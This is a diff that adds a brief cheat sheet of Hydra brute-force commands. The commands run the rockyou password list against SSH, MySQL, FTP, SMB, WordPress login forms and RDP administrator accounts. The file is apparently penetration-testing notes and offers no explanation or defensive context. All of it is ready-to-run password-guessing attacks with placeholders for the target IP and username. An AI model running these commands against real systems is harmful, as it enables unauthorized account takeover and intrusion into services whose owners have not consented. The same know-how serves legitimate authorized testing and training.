@@ -1,0 +1,20 @@
+++ SSH
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> ssh
+
+++ MYSQL
+hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt <ip> mysql
+
+++ FTP
+hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt <ip> ftp
+
+
+++ SMB
+hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt <ip> smb
+
+
+++ WORDPRESS
+hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt <ip> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+
+++ RDP
+hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<ip>
